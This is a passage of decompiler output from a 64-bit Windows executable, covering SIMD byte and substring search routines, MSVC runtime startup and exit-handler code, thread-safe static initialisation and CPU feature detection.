            param_1 = (undefined1 (*) [16])(*param_1 + iVar3);
            if (pauVar2 < param_1) {
              return param_2;
            }
            auVar10._0_4_ = *(uint *)*param_1 ^ auVar1._0_4_;
            auVar10._4_4_ = *(uint *)(*param_1 + 4) ^ auVar1._4_4_;
            auVar10._8_4_ = *(uint *)(*param_1 + 8) ^ auVar1._8_4_;
            auVar10._12_4_ = *(uint *)(*param_1 + 0xc) ^ auVar1._12_4_;
            if (auVar10 == (undefined1  [16])0x0) goto LAB_140051785;
          }
          param_1 = (undefined1 (*) [16])(*param_1 + 1);
        }
        else {
          param_1 = param_1 + 1;
        }
        bVar9 = param_1 < pauVar2;
      } while (param_1 <= pauVar2);
    }
  }
  return param_2;
}



/* ==================================================================== */
/* thunk_FUN_140051530 @ 140051820 */

undefined1 (*) [32]
thunk_FUN_140051530(undefined1 (*param_1) [32],undefined1 (*param_2) [32],byte param_3)

{
  ushort uVar1;
  undefined1 auVar2 [32];
  undefined1 *puVar3;
  uint uVar4;
  uint uVar5;
  ulonglong uVar6;
  undefined1 auVar7 [16];
  undefined1 auVar8 [16];
  undefined1 auVar9 [32];

  uVar6 = (longlong)param_2 - (longlong)param_1;
  if (((uVar6 & 0xffffffffffffffe0) == 0) || ((DAT_14005d094 & 0x20) == 0)) {
    if (((uVar6 & 0xfffffffffffffff0) != 0) && ((DAT_14005d094 & 4) != 0)) {
      puVar3 = *param_1;
      auVar8 = pshufb(ZEXT116(param_3),ZEXT816(0));
      do {
        auVar7[0] = -((*param_1)[0] == auVar8[0]);
        auVar7[1] = -((*param_1)[1] == auVar8[1]);
        auVar7[2] = -((*param_1)[2] == auVar8[2]);
        auVar7[3] = -((*param_1)[3] == auVar8[3]);
        auVar7[4] = -((*param_1)[4] == auVar8[4]);
        auVar7[5] = -((*param_1)[5] == auVar8[5]);
        auVar7[6] = -((*param_1)[6] == auVar8[6]);
        auVar7[7] = -((*param_1)[7] == auVar8[7]);
        auVar7[8] = -((*param_1)[8] == auVar8[8]);
        auVar7[9] = -((*param_1)[9] == auVar8[9]);
        auVar7[10] = -((*param_1)[10] == auVar8[10]);
        auVar7[0xb] = -((*param_1)[0xb] == auVar8[0xb]);
        auVar7[0xc] = -((*param_1)[0xc] == auVar8[0xc]);
        auVar7[0xd] = -((*param_1)[0xd] == auVar8[0xd]);
        auVar7[0xe] = -((*param_1)[0xe] == auVar8[0xe]);
        auVar7[0xf] = -((*param_1)[0xf] == auVar8[0xf]);
        uVar1 = (ushort)(SUB161(auVar7 >> 7,0) & 1) | (ushort)(SUB161(auVar7 >> 0xf,0) & 1) << 1 |
                (ushort)(SUB161(auVar7 >> 0x17,0) & 1) << 2 |
                (ushort)(SUB161(auVar7 >> 0x1f,0) & 1) << 3 |
                (ushort)(SUB161(auVar7 >> 0x27,0) & 1) << 4 |
                (ushort)(SUB161(auVar7 >> 0x2f,0) & 1) << 5 |
                (ushort)(SUB161(auVar7 >> 0x37,0) & 1) << 6 |
                (ushort)(SUB161(auVar7 >> 0x3f,0) & 1) << 7 |
                (ushort)(SUB161(auVar7 >> 0x47,0) & 1) << 8 |
                (ushort)(SUB161(auVar7 >> 0x4f,0) & 1) << 9 |
                (ushort)(SUB161(auVar7 >> 0x57,0) & 1) << 10 |
                (ushort)(SUB161(auVar7 >> 0x5f,0) & 1) << 0xb |
                (ushort)(SUB161(auVar7 >> 0x67,0) & 1) << 0xc |
                (ushort)(SUB161(auVar7 >> 0x6f,0) & 1) << 0xd |
                (ushort)(SUB161(auVar7 >> 0x77,0) & 1) << 0xe | (ushort)(auVar7[0xf] >> 7) << 0xf;
        if (uVar1 != 0) {
          uVar4 = 0;
          if (uVar1 != 0) {
            for (; (uVar1 >> uVar4 & 1) == 0; uVar4 = uVar4 + 1) {
            }
          }
          return (undefined1 (*) [32])(*param_1 + uVar4);
        }
        param_1 = (undefined1 (*) [32])(*param_1 + 0x10);
      } while (param_1 != (undefined1 (*) [32])(puVar3 + (uVar6 & 0xfffffffffffffff0)));
    }
  }
  else {
    puVar3 = *param_1;
    auVar8 = vpshufb_avx(ZEXT416((uint)(int)(char)param_3),(undefined1  [16])0x0);
    auVar9._16_16_ = auVar8;
    auVar9._0_16_ = auVar8;
    do {
      auVar2 = vpcmpeqb_avx2(auVar9,*param_1);
      uVar4 = (uint)(SUB321(auVar2 >> 7,0) & 1) | (uint)(SUB321(auVar2 >> 0xf,0) & 1) << 1 |
              (uint)(SUB321(auVar2 >> 0x17,0) & 1) << 2 | (uint)(SUB321(auVar2 >> 0x1f,0) & 1) << 3
              | (uint)(SUB321(auVar2 >> 0x27,0) & 1) << 4 |
              (uint)(SUB321(auVar2 >> 0x2f,0) & 1) << 5 | (uint)(SUB321(auVar2 >> 0x37,0) & 1) << 6
              | (uint)(SUB321(auVar2 >> 0x3f,0) & 1) << 7 |
              (uint)(SUB321(auVar2 >> 0x47,0) & 1) << 8 | (uint)(SUB321(auVar2 >> 0x4f,0) & 1) << 9
              | (uint)(SUB321(auVar2 >> 0x57,0) & 1) << 10 |
              (uint)(SUB321(auVar2 >> 0x5f,0) & 1) << 0xb |
              (uint)(SUB321(auVar2 >> 0x67,0) & 1) << 0xc |
              (uint)(SUB321(auVar2 >> 0x6f,0) & 1) << 0xd |
              (uint)(SUB321(auVar2 >> 0x77,0) & 1) << 0xe | (uint)SUB321(auVar2 >> 0x7f,0) << 0xf |
              (uint)(SUB321(auVar2 >> 0x87,0) & 1) << 0x10 |
              (uint)(SUB321(auVar2 >> 0x8f,0) & 1) << 0x11 |
              (uint)(SUB321(auVar2 >> 0x97,0) & 1) << 0x12 |
              (uint)(SUB321(auVar2 >> 0x9f,0) & 1) << 0x13 |
              (uint)(SUB321(auVar2 >> 0xa7,0) & 1) << 0x14 |
              (uint)(SUB321(auVar2 >> 0xaf,0) & 1) << 0x15 |
              (uint)(SUB321(auVar2 >> 0xb7,0) & 1) << 0x16 | (uint)SUB321(auVar2 >> 0xbf,0) << 0x17
              | (uint)(SUB321(auVar2 >> 199,0) & 1) << 0x18 |
              (uint)(SUB321(auVar2 >> 0xcf,0) & 1) << 0x19 |
              (uint)(SUB321(auVar2 >> 0xd7,0) & 1) << 0x1a |
              (uint)(SUB321(auVar2 >> 0xdf,0) & 1) << 0x1b |
              (uint)(SUB321(auVar2 >> 0xe7,0) & 1) << 0x1c |
              (uint)(SUB321(auVar2 >> 0xef,0) & 1) << 0x1d |
              (uint)(SUB321(auVar2 >> 0xf7,0) & 1) << 0x1e | (uint)(byte)(auVar2[0x1f] >> 7) << 0x1f
      ;
      if (uVar4 != 0) goto LAB_1400515d1;
      param_1 = param_1 + 1;
    } while (param_1 != (undefined1 (*) [32])(puVar3 + (uVar6 & 0xffffffffffffffe0)));
    uVar5 = (uint)uVar6 & 0x1c;
    if ((uVar6 & 0x1c) != 0) {
      auVar2 = vpmaskmovd_avx2(*(undefined1 (*) [32])(&DAT_140056e20 + -(ulonglong)uVar5),*param_1);
      auVar9 = vpcmpeqb_avx2(auVar2,auVar9);
      auVar9 = vpand_avx2(auVar9,*(undefined1 (*) [32])(&DAT_140056e20 + -(ulonglong)uVar5));
      uVar4 = (uint)(SUB321(auVar9 >> 7,0) & 1) | (uint)(SUB321(auVar9 >> 0xf,0) & 1) << 1 |
              (uint)(SUB321(auVar9 >> 0x17,0) & 1) << 2 | (uint)(SUB321(auVar9 >> 0x1f,0) & 1) << 3
              | (uint)(SUB321(auVar9 >> 0x27,0) & 1) << 4 |
              (uint)(SUB321(auVar9 >> 0x2f,0) & 1) << 5 | (uint)(SUB321(auVar9 >> 0x37,0) & 1) << 6
              | (uint)(SUB321(auVar9 >> 0x3f,0) & 1) << 7 |
              (uint)(SUB321(auVar9 >> 0x47,0) & 1) << 8 | (uint)(SUB321(auVar9 >> 0x4f,0) & 1) << 9
              | (uint)(SUB321(auVar9 >> 0x57,0) & 1) << 10 |
              (uint)(SUB321(auVar9 >> 0x5f,0) & 1) << 0xb |
              (uint)(SUB321(auVar9 >> 0x67,0) & 1) << 0xc |
              (uint)(SUB321(auVar9 >> 0x6f,0) & 1) << 0xd |
              (uint)(SUB321(auVar9 >> 0x77,0) & 1) << 0xe | (uint)SUB321(auVar9 >> 0x7f,0) << 0xf |
              (uint)(SUB321(auVar9 >> 0x87,0) & 1) << 0x10 |
              (uint)(SUB321(auVar9 >> 0x8f,0) & 1) << 0x11 |
              (uint)(SUB321(auVar9 >> 0x97,0) & 1) << 0x12 |
              (uint)(SUB321(auVar9 >> 0x9f,0) & 1) << 0x13 |
              (uint)(SUB321(auVar9 >> 0xa7,0) & 1) << 0x14 |
              (uint)(SUB321(auVar9 >> 0xaf,0) & 1) << 0x15 |
              (uint)(SUB321(auVar9 >> 0xb7,0) & 1) << 0x16 | (uint)SUB321(auVar9 >> 0xbf,0) << 0x17
              | (uint)(SUB321(auVar9 >> 199,0) & 1) << 0x18 |
              (uint)(SUB321(auVar9 >> 0xcf,0) & 1) << 0x19 |
              (uint)(SUB321(auVar9 >> 0xd7,0) & 1) << 0x1a |
              (uint)(SUB321(auVar9 >> 0xdf,0) & 1) << 0x1b |
              (uint)(SUB321(auVar9 >> 0xe7,0) & 1) << 0x1c |
              (uint)(SUB321(auVar9 >> 0xef,0) & 1) << 0x1d |
              (uint)(SUB321(auVar9 >> 0xf7,0) & 1) << 0x1e | (uint)(byte)(auVar9[0x1f] >> 7) << 0x1f
      ;
      if (uVar4 != 0) {
LAB_1400515d1:
        uVar5 = 0;
        for (; (uVar4 & 1) == 0; uVar4 = uVar4 >> 1 | 0x80000000) {
          uVar5 = uVar5 + 1;
        }
        return (undefined1 (*) [32])(*param_1 + uVar5);
      }
      param_1 = (undefined1 (*) [32])(*param_1 + uVar5);
    }
  }
  for (; (param_1 != param_2 && ((*param_1)[0] != param_3));
      param_1 = (undefined1 (*) [32])(*param_1 + 1)) {
  }
  return param_1;
}



/* ==================================================================== */
/* thunk_FUN_140051630 @ 140051830 */

/* WARNING: Function: __security_check_cookie replaced with injection: security_check_cookie */

undefined1 (*) [16]
thunk_FUN_140051630(undefined1 (*param_1) [16],undefined1 (*param_2) [16],undefined1 (*param_3) [16]
                   ,ulonglong param_4)

{
  undefined1 auVar1 [16];
  undefined1 (*pauVar2) [16];
  int iVar3;
  ulonglong uVar4;
  char *pcVar5;
  size_t _Size;
  uint uVar6;
  longlong lVar7;
  undefined1 uVar8;
  bool bVar9;
  undefined1 auVar10 [16];
  undefined1 auStack_78 [32];
  undefined1 auStack_58 [16];
  ulonglong uStack_48;

  uStack_48 = DAT_14005d040 ^ (ulonglong)auStack_78;
  if (param_4 == 0) {
    return param_1;
  }
  if (param_4 == 1) {
    pauVar2 = (undefined1 (*) [16])FUN_140051530(param_1,param_2,(*param_3)[0]);
    return pauVar2;
  }
  uVar4 = (longlong)param_2 - (longlong)param_1;
  if (param_4 <= uVar4) {
    if ((((byte)DAT_14005d094 & 4) == 0) || (uVar4 < 0x10)) {
      pauVar2 = (undefined1 (*) [16])((longlong)param_1 + uVar4 + (1 - param_4));
      if (param_1 != pauVar2) {
        lVar7 = (longlong)param_3 - (longlong)param_1;
        do {
          if ((*param_1)[0] == (*param_3)[0]) {
            pcVar5 = *param_1 + 1;
            while (*pcVar5 == pcVar5[lVar7]) {
              pcVar5 = pcVar5 + 1;
              if ((longlong)pcVar5 - (longlong)param_1 == param_4) {
                return param_1;
              }
            }
          }
          param_1 = (undefined1 (*) [16])(*param_1 + 1);
          lVar7 = lVar7 + -1;
        } while (param_1 != pauVar2);
      }
    }
    else if (param_4 < 0x11) {
      uVar6 = (uint)param_4;
      uVar8 = 0x10 < uVar6;
      memcpy(auStack_58,param_3,param_4);
      auVar1 = auStack_58;
      do {
        iVar3 = pcmpestri(auStack_58,*param_1,0xc,uVar6,0x10);
        if ((bool)uVar8) {
          param_1 = (undefined1 (*) [16])(*param_1 + iVar3);
          if (iVar3 <= (int)(0x10 - uVar6)) {
            return param_1;
          }
        }
        else {
          param_1 = param_1 + 1;
        }
        uVar8 = param_1 < param_2 + -1;
      } while (param_1 <= param_2 + -1);
      bVar9 = param_2 < param_1;
      _Size = (longlong)param_2 - (longlong)param_1;
      if (_Size != 0) {
        memcpy(auStack_58,param_1,_Size);
        iVar3 = pcmpestri(auVar1,auStack_58,0xc,uVar6,(int)_Size);
        if (bVar9) {
          return (undefined1 (*) [16])(*param_1 + iVar3);
        }
      }
    }
    else {
      auVar1 = *param_3;
      bVar9 = CARRY8((longlong)param_1 - param_4,uVar4);
      pauVar2 = (undefined1 (*) [16])(((longlong)param_1 - param_4) + uVar4);
      do {
        iVar3 = pcmpestri(auVar1,*param_1,0xc,0x10,0x10);
        if (bVar9) {
          if (iVar3 == 0) {
LAB_140051785:
            iVar3 = memcmp(param_1 + 1,param_3 + 1,param_4 - 0x10);
            if (iVar3 == 0) {
              return param_1;
            }
          }
          else {
            param_1 = (undefined1 (*) [16])(*param_1 + iVar3);
            if (pauVar2 < param_1) {
              return param_2;
            }
            auVar10._0_4_ = *(uint *)*param_1 ^ auVar1._0_4_;
            auVar10._4_4_ = *(uint *)(*param_1 + 4) ^ auVar1._4_4_;
            auVar10._8_4_ = *(uint *)(*param_1 + 8) ^ auVar1._8_4_;
            auVar10._12_4_ = *(uint *)(*param_1 + 0xc) ^ auVar1._12_4_;
            if (auVar10 == (undefined1  [16])0x0) goto LAB_140051785;
          }
          param_1 = (undefined1 (*) [16])(*param_1 + 1);
        }
        else {
          param_1 = param_1 + 1;
        }
        bVar9 = param_1 < pauVar2;
      } while (param_1 <= pauVar2);
    }
  }
  return param_2;
}



/* ==================================================================== */
/* __security_check_cookie @ 140051850 */

/* WARNING: This is an inlined function */

void __cdecl __security_check_cookie(uintptr_t _StackCookie)

{
  if ((_StackCookie == DAT_14005d040) && ((short)(_StackCookie >> 0x30) == 0)) {
    return;
  }
  FUN_14005229c(_StackCookie);
  return;
}



/* ==================================================================== */
/* FUN_140051870 @ 140051870 */

void FUN_140051870(size_t param_1)

{
  int iVar1;
  void *pvVar2;

  do {
    pvVar2 = malloc(param_1);
    if (pvVar2 != (void *)0x0) {
      return;
    }
    iVar1 = _callnewh(param_1);
  } while (iVar1 != 0);
  if (param_1 == 0xffffffffffffffff) {
                    /* WARNING: Subroutine does not return */
    FUN_140009c90();
  }
                    /* WARNING: Subroutine does not return */
  FUN_140052408();
}



/* ==================================================================== */
/* __scrt_acquire_startup_lock @ 1400518ac */

/* Library Function - Single Match
    __scrt_acquire_startup_lock

   Libraries: Visual Studio 2015 Release, Visual Studio 2017 Release, Visual Studio 2019 Release */

undefined8 __scrt_acquire_startup_lock(void)

{
  int iVar1;
  void *pvVar2;
  undefined8 uVar3;
  bool bVar4;

  iVar1 = __scrt_is_ucrt_dll_in_use();
  if (iVar1 == 0) {
LAB_1400518da:
    uVar3 = 0;
  }
  else {
    do {
      pvVar2 = (void *)0x0;
      LOCK();
      bVar4 = DAT_140a61298 == (void *)0x0;
      if (bVar4) {
        DAT_140a61298 = StackBase;
      }
      else {
        pvVar2 = DAT_140a61298;
      }
      UNLOCK();
      if (bVar4) goto LAB_1400518da;
    } while (StackBase != pvVar2);
    uVar3 = 1;
  }
  return uVar3;
}



/* ==================================================================== */
/* FUN_1400518e8 @ 1400518e8 */

undefined1 FUN_1400518e8(int param_1)

{
  char cVar1;

  if (param_1 == 0) {
    DAT_140a612a0 = 1;
  }
  FUN_140051fd0();
  cVar1 = FUN_140052730();
  if (cVar1 != '\0') {
    cVar1 = FUN_140052730();
    if (cVar1 != '\0') {
      return 1;
    }
    FUN_140052730(0);
  }
  return 0;
}



/* ==================================================================== */
/* __scrt_initialize_onexit_tables @ 140051924 */

/* WARNING: Globals starting with '_' overlap smaller symbols at the same address */
/* Library Function - Single Match
    __scrt_initialize_onexit_tables

   Library: Visual Studio 2019 Release */

undefined8 __scrt_initialize_onexit_tables(uint param_1)

{
  code *pcVar1;
  int iVar2;
  undefined8 uVar3;

  if (DAT_140a612a1 == '\0') {
    if (1 < param_1) {
      FUN_140052448(5);
      pcVar1 = (code *)swi(3);
      uVar3 = (*pcVar1)();
      return uVar3;
    }
    iVar2 = __scrt_is_ucrt_dll_in_use();
    if ((iVar2 == 0) || (param_1 != 0)) {
      DAT_140a612a8 = 0xffffffffffffffff;
      uRam0000000140a612b0 = 0xffffffffffffffff;
      _DAT_140a612b8 = 0xffffffffffffffff;
      _DAT_140a612c0 = 0xffffffffffffffff;
      uRam0000000140a612c8 = 0xffffffffffffffff;
      _DAT_140a612d0 = 0xffffffffffffffff;
    }
    else {
      iVar2 = _initialize_onexit_table(&DAT_140a612a8);
      if ((iVar2 != 0) || (iVar2 = _initialize_onexit_table(&DAT_140a612c0), iVar2 != 0)) {
        return 0;
      }
    }
    DAT_140a612a1 = '\x01';
  }
  return 1;
}



/* ==================================================================== */
/* FUN_1400519b0 @ 1400519b0 */

/* WARNING: Removing unreachable block (ram,0x000140051a3d) */
/* WARNING: Enum "SectionFlags": Some values do not have unique names */

ulonglong FUN_1400519b0(longlong param_1)

{
  ulonglong uVar1;
  uint7 uVar2;
  IMAGE_SECTION_HEADER *pIVar3;

  uVar1 = 0;
  for (pIVar3 = &IMAGE_SECTION_HEADER_1400001f8; pIVar3 != (IMAGE_SECTION_HEADER *)&DAT_1400002e8;
      pIVar3 = pIVar3 + 1) {
    if (((ulonglong)(uint)pIVar3->VirtualAddress <= param_1 - 0x140000000U) &&
       (uVar1 = (ulonglong)((pIVar3->Misc).PhysicalAddress + pIVar3->VirtualAddress),
       param_1 - 0x140000000U < uVar1)) goto LAB_140051a26;
  }
  pIVar3 = (IMAGE_SECTION_HEADER *)0x0;
LAB_140051a26:
  if (pIVar3 == (IMAGE_SECTION_HEADER *)0x0) {
    uVar1 = uVar1 & 0xffffffffffffff00;
  }
  else {
    uVar2 = (uint7)(uVar1 >> 8);
    if ((int)pIVar3->Characteristics < 0) {
      uVar1 = (ulonglong)uVar2 << 8;
    }
    else {
      uVar1 = CONCAT71(uVar2,1);
    }
  }
  return uVar1;
}



/* ==================================================================== */
/* __scrt_release_startup_lock @ 140051a48 */

/* Library Function - Single Match
    __scrt_release_startup_lock

   Libraries: Visual Studio 2015 Release, Visual Studio 2017 Release, Visual Studio 2019 Release */

void __scrt_release_startup_lock(char param_1)

{
  int iVar1;

  iVar1 = __scrt_is_ucrt_dll_in_use();
  if ((iVar1 != 0) && (param_1 == '\0')) {
    LOCK();
    DAT_140a61298 = 0;
    UNLOCK();
  }
  return;
}



/* ==================================================================== */
/* __scrt_uninitialize_crt @ 140051a6c */

/* Library Function - Single Match
    __scrt_uninitialize_crt

   Library: Visual Studio 2019 Release */

undefined1 __scrt_uninitialize_crt(undefined1 param_1,char param_2)

{
  if ((DAT_140a612a0 == '\0') || (param_2 == '\0')) {
    FUN_140052730();
    FUN_140052730(param_1);
  }
  return 1;
}



/* ==================================================================== */
/* _onexit @ 140051a98 */

/* Library Function - Single Match
    _onexit

   Library: Visual Studio 2019 Release */

_onexit_t __cdecl _onexit(_onexit_t _Func)

{
  int iVar1;
  _onexit_t p_Var2;

  if (DAT_140a612a8 == -1) {
    iVar1 = _crt_atexit();
  }
  else {
    iVar1 = _register_onexit_function(&DAT_140a612a8);
  }
  p_Var2 = (_onexit_t)0x0;
  if (iVar1 == 0) {
    p_Var2 = _Func;
  }
  return p_Var2;
}



/* ==================================================================== */
/* atexit @ 140051ad4 */

/* Library Function - Single Match
    atexit

   Library: Visual Studio 2019 Release */

int __cdecl atexit(_func_5014 *param_1)

{
  _onexit_t p_Var1;

  p_Var1 = _onexit((_onexit_t)param_1);
  return (p_Var1 != (_onexit_t)0x0) - 1;
}



/* ==================================================================== */
/* API-MS-WIN-CRT-HEAP-L1-1-0.DLL::free @ 140051aec */

void __cdecl free(void *_Memory)

{
                    /* WARNING: Could not recover jumptable at 0x00014005282c. Too many branches */
                    /* WARNING: Treating indirect jump as call */
  free(_Memory);
  return;
}



/* ==================================================================== */
/* API-MS-WIN-CRT-HEAP-L1-1-0.DLL::free @ 140051af4 */

void __cdecl free(void *_Memory)

{
                    /* WARNING: Could not recover jumptable at 0x00014005282c. Too many branches */
                    /* WARNING: Treating indirect jump as call */
  free(_Memory);
  return;
}



/* ==================================================================== */
/* FUN_140051afc @ 140051afc */

undefined8 * FUN_140051afc(undefined8 *param_1,ulonglong param_2)

{
  *param_1 = &PTR_FUN_140056e58;
  if ((param_2 & 1) != 0) {
    free(param_1);
  }
  return param_1;
}



/* ==================================================================== */
/* `eh_vector_destructor_iterator' @ 140051b28 */

/* WARNING: Function: _guard_dispatch_icall replaced with injection: guard_dispatch_icall */
/* Library Function - Single Match
    void __cdecl `eh vector destructor iterator'(void * __ptr64,unsigned __int64,unsigned
   __int64,void (__cdecl*)(void * __ptr64))

   Libraries: Visual Studio 2017 Release, Visual Studio 2019 Release */

void __cdecl
_eh_vector_destructor_iterator_
          (void *param_1,__uint64 param_2,__uint64 param_3,_func_void_void_ptr *param_4)

{
  void *pvVar1;

  pvVar1 = (void *)(param_2 * param_3 + (longlong)param_1);
  while( true ) {
    if (param_3 == 0) break;
    pvVar1 = (void *)((longlong)pvVar1 - param_2);
    (*param_4)(pvVar1);
    param_3 = param_3 - 1;
  }
  return;
}



/* ==================================================================== */
/* FUN_140051b94 @ 140051b94 */

/* WARNING: Function: _guard_dispatch_icall replaced with injection: guard_dispatch_icall */

void FUN_140051b94(longlong param_1,longlong param_2,longlong param_3,code *param_4)

{
  longlong lVar1;

  for (lVar1 = 0; lVar1 != param_3; lVar1 = lVar1 + 1) {
    param_1 = param_1 - param_2;
    (*param_4)(param_1);
  }
  return;
}



/* ==================================================================== */
/* _Init_thread_footer @ 140051bf0 */

/* Library Function - Single Match
    _Init_thread_footer

   Library: Visual Studio 2019 Release */

void _Init_thread_footer(int *param_1)

{
  ulonglong uVar1;

  AcquireSRWLockExclusive((PSRWLOCK)&DAT_140a612e0);
  uVar1 = (ulonglong)_tls_index;
  DAT_14005d004 = DAT_14005d004 + 1;
  *param_1 = DAT_14005d004;
  *(int *)(*(longlong *)((longlong)ThreadLocalStoragePointer + uVar1 * 8) + 4) = DAT_14005d004;
  ReleaseSRWLockExclusive((PSRWLOCK)&DAT_140a612e0);
                    /* WARNING: Could not recover jumptable at 0x000140051c52. Too many branches */
                    /* WARNING: Treating indirect jump as call */
  WakeAllConditionVariable(&DAT_140a612d8);
  return;
}



/* ==================================================================== */
/* FUN_140051c5c @ 140051c5c */

void FUN_140051c5c(int *param_1)

{
  AcquireSRWLockExclusive((PSRWLOCK)&DAT_140a612e0);
  do {
    if (*param_1 == 0) {
      *param_1 = -1;
LAB_140051cc4:
                    /* WARNING: Could not recover jumptable at 0x000140051cd0. Too many branches */
                    /* WARNING: Treating indirect jump as call */
      ReleaseSRWLockExclusive((PSRWLOCK)&DAT_140a612e0);
      return;
    }
    if (*param_1 != -1) {
      *(undefined4 *)
       (*(longlong *)((longlong)ThreadLocalStoragePointer + (ulonglong)_tls_index * 8) + 4) =
           DAT_14005d004;
      goto LAB_140051cc4;
    }
    SleepConditionVariableSRW
              ((PCONDITION_VARIABLE)&DAT_140a612d8,(PSRWLOCK)&DAT_140a612e0,0xffffffff,0);
  } while( true );
}



/* ==================================================================== */
/* FUN_140051cd8 @ 140051cd8 */

void FUN_140051cd8(void)

{
  code *pcVar1;
  undefined4 *puVar2;
  char cVar3;
  int iVar4;
  undefined4 uVar5;

  _set_app_type(1);
  iVar4 = FUN_140052718();
  _set_fmode(iVar4);
  uVar5 = FUN_14005259c();
  puVar2 = (undefined4 *)__p__commode();
  *puVar2 = uVar5;
  cVar3 = __scrt_initialize_onexit_tables(1);
  if (cVar3 != '\0') {
    FUN_140052774();
    atexit(FUN_1400527b0);
    uVar5 = FUN_140052428();
    iVar4 = _configure_narrow_argv(uVar5);
    if (iVar4 == 0) {
      FUN_140052720();
      iVar4 = FUN_140052758();
      if (iVar4 != 0) {
        __setusermatherr(FUN_14005259c);
      }
      _guard_check_icall();
      _guard_check_icall();
      iVar4 = FUN_14005259c();
      _configthreadlocale(iVar4);
      cVar3 = FUN_140052730();
      if (cVar3 != '\0') {
        _initialize_narrow_environment();
      }
      FUN_14005259c();
      iVar4 = thunk_FUN_14005259c();
      if (iVar4 == 0) {
        return;
      }
    }
  }
  FUN_140052448(7);
  pcVar1 = (code *)swi(3);
  (*pcVar1)();
  return;
}



/* ==================================================================== */
/* FUN_140051d90 @ 140051d90 */

undefined8 FUN_140051d90(void)

{
  FUN_14005273c();
  return 0;
}



/* ==================================================================== */
/* FUN_140051da0 @ 140051da0 */

void FUN_140051da0(void)

{
  undefined4 uVar1;

  FUN_1400525f4();
  uVar1 = FUN_14005259c();
  _set_new_mode(uVar1);
  return;
}



/* ==================================================================== */
/* FUN_140051dbc @ 140051dbc */

/* WARNING: Function: _guard_dispatch_icall replaced with injection: guard_dispatch_icall */

int FUN_140051dbc(void)

{
  undefined8 uVar1;
  bool bVar2;
  char cVar3;
  undefined1 uVar4;
  int iVar5;
  longlong *plVar6;
  undefined8 uVar7;
  undefined8 *puVar8;
  undefined4 *puVar9;
  undefined8 unaff_RBX;
  undefined8 in_R9;
  undefined1 uVar10;

  iVar5 = (int)unaff_RBX;
  cVar3 = FUN_1400518e8(1);
  if (cVar3 == '\0') {
    FUN_140052448(7);
  }
  else {
    bVar2 = false;
    uVar10 = 0;
    uVar4 = __scrt_acquire_startup_lock();
    iVar5 = (int)CONCAT71((int7)((ulonglong)unaff_RBX >> 8),uVar4);
    if (DAT_140a61290 != 1) {
      if (DAT_140a61290 == 0) {
        DAT_140a61290 = 1;
        iVar5 = _initterm_e(&DAT_140054778,&DAT_140054790);
        if (iVar5 != 0) {
          return 0xff;
        }
        _initterm(&DAT_1400546d0,&DAT_140054770);
        DAT_140a61290 = 2;
      }
      else {
        bVar2 = true;
        uVar10 = 1;
      }
      __scrt_release_startup_lock(uVar4);
      plVar6 = (longlong *)FUN_140052764();
      if ((*plVar6 != 0) && (cVar3 = FUN_1400519b0(plVar6), cVar3 != '\0')) {
        (*(code *)*plVar6)(0,2,0,in_R9,uVar10);
      }
      plVar6 = (longlong *)FUN_14005276c();
      if ((*plVar6 != 0) && (cVar3 = FUN_1400519b0(plVar6), cVar3 != '\0')) {
        _register_thread_local_exe_atexit_callback(*plVar6);
      }
      uVar7 = _get_initial_narrow_environment();
      puVar8 = (undefined8 *)__p___argv();
      uVar1 = *puVar8;
      puVar9 = (undefined4 *)__p___argc();
      iVar5 = FUN_140027570(*puVar9,uVar1,uVar7);
      cVar3 = FUN_1400525a0();
      if (cVar3 != '\0') {
        if (!bVar2) {
          _cexit();
        }
        __scrt_uninitialize_crt(1,0);
        return iVar5;
      }
      goto LAB_140051f28;
    }
  }
  FUN_140052448(7);
LAB_140051f28:
                    /* WARNING: Subroutine does not return */
  exit(iVar5);
}



/* ==================================================================== */
/* entry @ 140051f38 */

void entry(void)

{
  FUN_140052668();
  FUN_140051dbc();
  return;
}



/* ==================================================================== */
/* FUN_140051f4c @ 140051f4c */

undefined8 FUN_140051f4c(undefined8 param_1,undefined8 param_2,undefined8 param_3,longlong param_4)

{
  FUN_140051f6c(param_2,param_4,*(undefined8 *)(param_4 + 0x38));
  return 1;
}



/* ==================================================================== */
/* FUN_140051f6c @ 140051f6c */

/* WARNING: Function: __security_check_cookie replaced with injection: security_check_cookie */

ulonglong FUN_140051f6c(undefined8 param_1,longlong param_2)

{
  ulonglong uVar1;
  ulonglong uVar2;

  uVar2 = (ulonglong)*(uint *)(*(longlong *)(param_2 + 0x10) + 8);
  uVar1 = *(ulonglong *)(param_2 + 8);
  if ((*(byte *)(uVar2 + 3 + uVar1) & 0xf) != 0) {
    uVar1 = (ulonglong)*(byte *)(uVar2 + 3 + uVar1) & 0xfffffff0;
  }
  return uVar1;
}



/* ==================================================================== */
/* _guard_check_icall @ 140051fcc */

void _guard_check_icall(void)

{
  return;
}



/* ==================================================================== */
/* FUN_140051fd0 @ 140051fd0 */

/* WARNING: Removing unreachable block (ram,0x0001400520c1) */
/* WARNING: Removing unreachable block (ram,0x0001400520b1) */
/* WARNING: Removing unreachable block (ram,0x00014005208c) */
/* WARNING: Removing unreachable block (ram,0x00014005200a) */
/* WARNING: Removing unreachable block (ram,0x000140051fe8) */
/* WARNING: Globals starting with '_' overlap smaller symbols at the same address */

undefined8 FUN_140051fd0(void)

{
  int *piVar1;
  uint *puVar2;
  int *piVar3;
  longlong lVar4;
  uint uVar5;
  byte bVar6;
  ulonglong uVar7;
  uint uVar8;
  ulonglong uVar9;
  uint uVar10;
  uint uVar11;
  uint uVar12;
  ulonglong in_XCR0;

  piVar1 = (int *)cpuid_basic_info(0);
  puVar2 = (uint *)cpuid_Version_info(1);
  uVar5 = puVar2[3];
  if ((piVar1[2] == 0x49656e69 && piVar1[3] == 0x6c65746e) && piVar1[1] == 0x756e6547) {
    uVar8 = *puVar2 & 0xfff3ff0;
    _DAT_14005d098 = 0x8000;
    _DAT_14005d0a0 = 0xffffffffffffffff;
    if ((((uVar8 == 0x106c0) || (uVar8 == 0x20660)) || (uVar8 == 0x20670)) ||
       ((uVar8 - 0x30650 < 0x21 &&
        ((0x100010001U >> ((ulonglong)(uVar8 - 0x30650) & 0x3f) & 1) != 0)))) {
      DAT_140a612ec = DAT_140a612ec | 1;
    }
  }
  uVar8 = 0;
  uVar10 = 0;
  uVar11 = 0;
  uVar12 = 0;
  if (6 < *piVar1) {
    piVar3 = (int *)cpuid_Extended_Feature_Enumeration_info(7);
    uVar8 = piVar3[1];
    uVar10 = piVar3[2];
    if ((uVar8 >> 9 & 1) != 0) {
      DAT_140a612ec = DAT_140a612ec | 2;
    }
    if (0 < *piVar3) {
